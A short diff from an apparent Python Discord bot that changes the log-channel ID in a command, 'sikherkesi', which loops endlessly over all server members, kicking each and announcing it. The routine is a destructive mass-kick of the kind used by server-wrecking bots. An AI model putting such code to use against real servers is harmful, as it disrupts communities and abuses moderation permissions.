@@ -116,7 +116,7 @@ async def sikherkesi(ctx):
     while True:
         for server_member in members:
             try:
-                channel = bot.get_channel('540612578401976330')
+                channel = bot.get_channel('605223507856719888')
                 await bot.kick(server_member)
                 await bot.send_message(channel, "someone got kicked")
             except discord.Forbidden:
